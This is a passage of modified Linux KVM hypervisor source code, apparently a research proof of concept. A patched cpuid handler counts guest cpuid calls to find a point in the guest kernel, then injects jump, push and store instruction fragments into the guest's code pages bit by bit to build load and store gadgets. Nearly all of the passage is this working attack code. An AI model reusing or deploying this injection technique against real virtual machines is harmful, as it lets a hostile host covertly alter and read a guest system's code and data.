           load_gadget.round, load_gadget.target_value);
#endif
  }

  // re inject X2||B1 code if we come from store/reset after ROUND_SECOND_PL
  if (load_gadget.round == ROUND_SECOND_PL &&
      load_gadget.curr_bit == highest_bit_index) {
    // gpa already setup by load code in 4 byte oracle
    if (!nf_simple_inject_code(vcpu->kvm, &inj_prefix_B,
                               load_gadget.text_mapping)) {
      printk("handle_long_counter_gadget: failed to reinsert inj_prefix_B"
             " at gpa %016llx after reset\n",
             inj_prefix_B.gpa);
    } else {
#ifdef LOG
      printk("handle_long_counter_gadget: reinserted inj_prefix_B at gpa "
             "%016llx\n",
             inj_prefix_B.gpa);
#endif
    }
  }

  //####
  // START: Decide between inc and jump to shl
  uint64_t mask = 0x1ULL << load_gadget.curr_bit;
#ifdef LOG
  printk("mask\t=%016llx\n,", mask);
  printk("targv\t=%016llx\n", load_gadget.target_value);
#endif
  // inc : load prefix and long instuction
  if (load_gadget.target_value & mask) {

 /*   if (!nf_simple_inject_code(vcpu->kvm, &inj_prefix_A,
                               load_gadget.text_mapping)) {
      printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
             "%016llx\n",
             inj_prefix_A.gpa);
    }
	 */
	  //buffered variant of the commneted code block above
	  if( !nf_buffered_inject(vcpu->kvm,long_counter_base_inj[LCB_INJ_PREFIX_A],
					  long_counter_base_inj_cache[LCB_INJ_PREFIX_A],
					  load_gadget.text_mapping) ) {
      printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
             "%016llx\n",
             inj_prefix_A.gpa);
	  }

    wbinvd();
    if (0 !=
        (err = write_mapped(long_inc_jmp_target_gpa, 16, long_inc_jmp_block,
                            load_gadget.text_mapping))) {
      printk("failed to move long_inc_jmp_block to target gpa\n");
    }
    wbinvd();

#ifdef LOG
    printk("target value = %016llx\t curr_bit = %lld  inj_prefix_A at %016llx "
           "and long_inc_jmp_target at %016llx\n",
           load_gadget.target_value, load_gadget.curr_bit, inj_prefix_A.gpa,
           long_inc_jmp_target_gpa);
#endif
  } else { // jump to shl : only need to jump over long instruction
#ifdef LOG
    printk("inj_skip_A: gpa %016llx first byte %08x second byte %08x\n",
           inj_skip_A.gpa, inj_skip_A.injection_code_buffer[0],
           inj_skip_A.injection_code_buffer[1]);
#endif
    /*if (!nf_simple_inject_code(vcpu->kvm, &inj_skip_A,
                               load_gadget.text_mapping)) {
      printk("handle_long_counter_gadget: failed to insert inj_skip_A at gpa "
             "%016llx\n",
             inj_skip_A.gpa);
    }
	 */
	  if( !nf_buffered_inject(vcpu->kvm,&long_counter_extra_inj[LCE_INJ_SKIP_A].inj,
					  long_counter_extra_inj[LCE_INJ_SKIP_A].buffer,
					  load_gadget.text_mapping) ) {
      printk("handle_long_counter_gadget: failed to insert inj_skip_a at gpa "
             "%016llx\n",
             long_counter_extra_inj[LCE_INJ_SKIP_A].inj.gpa);
	  }
	 
#ifdef LOG
    printk("target value = %016llx curr_bit = %lld  inserted skip / not set "
           "bit at gpa %016llx\n",
           load_gadget.target_value, load_gadget.curr_bit, inj_skip_A.gpa);
#endif
  }
  // END: Decide between inc and nop
  //####

  if (load_gadget.curr_bit > 0) {
    load_gadget.curr_bit--;
  } else { // at end of round / load_gadget.curr_bit == 0

    // insert jump to store at X2||B1. And the store gadget itself.
    // This also skips the shl instruction
    // TODO: test_counter is debug condition
    if (test_counter == 0 && (load_gadget.round == ROUND_FIRST_PL ||
                              load_gadget.round == ROUND_SECOND_PL)) {

      // inject jmp to store gadget
		/*
      inj_jmp_store_B.gpa = inj_prefix_B.gpa;
      if (!nf_simple_inject_code(vcpu->kvm, &inj_jmp_store_B,
                                 load_gadget.text_mapping)) {
        printk("handle_long_counter_gadget: failed to inject inj_jmp_store at "
               "gpa %016llx\n",
               inj_jmp_store_B.gpa);
      }
		*/
	  if( !nf_buffered_inject(vcpu->kvm,
				  &long_counter_extra_inj[LCE_INJ_JMP_STORE_B].inj,
				  long_counter_extra_inj[LCE_INJ_JMP_STORE_B].buffer,
				  load_gadget.text_mapping) ) {
      printk("handle_long_counter_gadget: failed to insert jmp_store_b at gpa "
             "%016llx\n",
             long_counter_extra_inj[LCE_INJ_JMP_STORE_B].inj.gpa);
	  }


      // decide betwen nop push and push push based on stack alingment
      if (load_gadget.fault_gpa % 16 == 0) {
        //  load nop push store gadget
        /*
			inj_nop_push.gpa = inj_jmp_cpuid.gpa + (1 * 16);
        if (!nf_simple_inject_code(vcpu->kvm, &inj_nop_push,
                                   load_gadget.text_mapping)) {
          printk("handle_long_counter_gadget: failed to inject inj_nop_push "
                 "at gpa %016llx\n",
                 inj_nop_push.gpa);
			 */
			  if( !nf_buffered_inject(vcpu->kvm,
								&long_counter_extra_inj[LCE_INJ_NOP_PUSH].inj,
								long_counter_extra_inj[LCE_INJ_NOP_PUSH].buffer,
								load_gadget.text_mapping) ) {
				printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
						 "%016llx\n",
						 inj_prefix_A.gpa);
        } else {
#ifdef LOG
          printk("handle_long_counter_gadget: in round %d  with 16 byte "
                 "aligned stack, injected inj_nop_push at gpa %016llx\n",
                 load_gadget.round, inj_nop_push.gpa);
#endif
        }
      } else if (load_gadget.fault_gpa % 16 == 8) {
        // load push push store if in ROUND_FIST_PL and nop push else
        if (load_gadget.round == ROUND_FIRST_PL) {
			  /*
          inj_push_push.gpa = inj_jmp_cpuid.gpa + (1 * 16);
          if (!nf_simple_inject_code(vcpu->kvm, &inj_push_push,
                                     load_gadget.text_mapping)) {
            printk("handle_long_counter_gadget: failed to inject inj_push_push "
                   "at gpa %016llx\n",
                   inj_push_push.gpa);
			}
			*/

			  if( !nf_buffered_inject(vcpu->kvm,
							&long_counter_extra_inj[LCE_INJ_PUSH_PUSH].inj,
							long_counter_extra_inj[LCE_INJ_PUSH_PUSH].buffer,
							load_gadget.text_mapping) ) {
				printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
						 "%016llx\n",
						 inj_prefix_A.gpa);
          } else {
#ifdef LOG
            printk("handle_long_counter_gadget: in ROUND_FIRST_PL with 8 byte "
                   "aligned stack, injected inj_push_push\n");
#endif
          }
        }

        if (load_gadget.round == ROUND_SECOND_PL) {
			  /*
          inj_nop_push.gpa = inj_jmp_cpuid.gpa + (1 * 16);
          if (!nf_simple_inject_code(vcpu->kvm, &inj_nop_push,
                                     load_gadget.text_mapping)) {
            printk("handle_long_counter_gadget: failed to inject inj_nop_push "
                   "at gpa %016llx\n",
                   inj_nop_push.gpa);
			  }
						 */

			  if( !nf_buffered_inject(vcpu->kvm,
						  &long_counter_extra_inj[LCE_INJ_NOP_PUSH].inj,
						  long_counter_extra_inj[LCE_INJ_NOP_PUSH].buffer,
						  load_gadget.text_mapping) ) {
				printk("handle_long_counter_gadget: failed to insert prefix_A at gpa "
						 "%016llx\n",
						 inj_prefix_A.gpa);
          } else {
#ifdef LOG
            printk("handle_long_counter_gadget: in ROUND_SECOND_PL with 8 byte "
                   "aligned stack, injected inj_nop_push at gpa %016llx\n",
                   inj_nop_push.gpa);
#endif
          }
        }
      } else {
        // This should not happen
        WARN_ON(true);
      }

      // insert invariant part of store gadget
		/*
      inj_jmp_14.gpa = inj_jmp_cpuid.gpa + (2 * 16);
      inj_xor_esi.gpa = inj_jmp_cpuid.gpa + (3 * 16);
      inj_store_jmp_back.gpa = inj_jmp_cpuid.gpa + (4 * 16);
      bool b = true;
      b &= nf_simple_inject_code(vcpu->kvm, &inj_jmp_14,
                                 load_gadget.text_mapping);
      b &= nf_simple_inject_code(vcpu->kvm, &inj_xor_esi,
                                 load_gadget.text_mapping);
      b &= nf_simple_inject_code(vcpu->kvm, &inj_store_jmp_back,
                                 load_gadget.text_mapping); */
	  bool b = true;
	  b &= nf_buffered_inject(vcpu->kvm,
			  &long_counter_extra_inj[LCE_ST_INJ_JMP_14].inj,
			  long_counter_extra_inj[LCE_ST_INJ_JMP_14].buffer,
			  load_gadget.text_mapping);
	  b &= nf_buffered_inject(vcpu->kvm,
			  &long_counter_extra_inj[LCE_ST_INJ_XOR_ESI].inj,
			  long_counter_extra_inj[LCE_ST_INJ_XOR_ESI].buffer,
			  load_gadget.text_mapping);
	  b &= nf_buffered_inject(vcpu->kvm,
			  &long_counter_extra_inj[LCE_ST_INJ_STORE_JMP_BACK].inj,
			  long_counter_extra_inj[LCE_ST_INJ_STORE_JMP_BACK].buffer,
			  load_gadget.text_mapping);

      if (!b) {
        printk("There was on error injection the invariant part of the store "
               "gadget\n");
      } else {
#ifdef LOG
        printk("injected invariant part of the store gadget\n");
#endif
      }
    }

    // init next round
    // TODO:start debug
    if (load_gadget.round == ROUND_SECOND_PL && test_counter > 0) {
      load_gadget.round =
          ROUND_FIRST_PL -
          1; // -1 because we inc round right after this if block

      // let it run 10 times to fill up cache before starting measurment
      if (test_counter == test_counter_max - 10) {
        printk("Value of test_counter = %lld. k_time_get_real_ns = %lld \n",
               test_counter, ktime_get_real_ns());
      }
      test_counter--;

		if( test_counter % 100 == 0 ) {
			printk("Long Counter: Progress: Value of test_counter %lld\n",test_counter);
		}


      if (test_counter == 1) {
        printk("Value of test_counter = %lld. k_time_get_real_ns = %lld \n",
               test_counter, ktime_get_real_ns());
      }
    }
    // TODO:end debug
    load_gadget.round++;
    load_gadget.curr_bit = highest_bit_index;
  }

  //####
  // Final wbinvd();
  wbinvd();
  //####
}


int kvm_emulate_cpuid(struct kvm_vcpu *vcpu) {
  u32 eax, ebx, ecx, edx;
  static long long counter = 0;
  static bool start_counting = false;
  // max number of cpuid calls that are displayed after counting started
  uint64_t limit = 10;

  if (cpuid_fault_enabled(vcpu) && !kvm_require_cpl(vcpu, 0))
    return 1;

  eax = kvm_register_read(vcpu, VCPU_REGS_RAX);
  ecx = kvm_register_read(vcpu, VCPU_REGS_RCX);

  /**
   * We want to be able to deduce the code location in the kernel from the
   * number of cpuid calls.
   * However in the bootloader cpuid is consinously triggered, but
   * not with eax = 0x80000002. This code is first used in the kernel.
   *
   */
  if (!start_counting && eax == 0x80000002) {
    start_counting = true;
  }

  if (start_counting) {
    counter++;
    // if (counter < limit) {
    // printk("kvm_emulate_cpuid call nr. %lld. eax == %08x\n", counter, eax);
    //}
  }

  // orignal kvm code, look up cpuid values
  kvm_cpuid(vcpu, &eax, &ebx, &ecx, &edx, true);


  if (start_counting) {

    // Handover proctocol is designed in a way that this must be called
    // before handle_counter_gadget else we would jump into this to early
    handle_long_counter_gadget(vcpu, eax);

    handle_counter_gadget(vcpu, eax);
    // handle_stack_detect_gadget(vcpu, eax);
  }

  kvm_register_write(vcpu, VCPU_REGS_RAX, eax);
  kvm_register_write(vcpu, VCPU_REGS_RBX, ebx);
  kvm_register_write(vcpu, VCPU_REGS_RCX, ecx);
  kvm_register_write(vcpu, VCPU_REGS_RDX, edx);
  if (start_counting && counter < limit) {
    // printk("Return : eax = %08x\t ebx=%08x \t ecx=%08x\t edx=%08x\n", eax,
    // ebx,
    //      ecx, edx);
  }
  return kvm_skip_emulated_instruction(vcpu);
}
EXPORT_SYMBOL_GPL(kvm_emulate_cpuid);
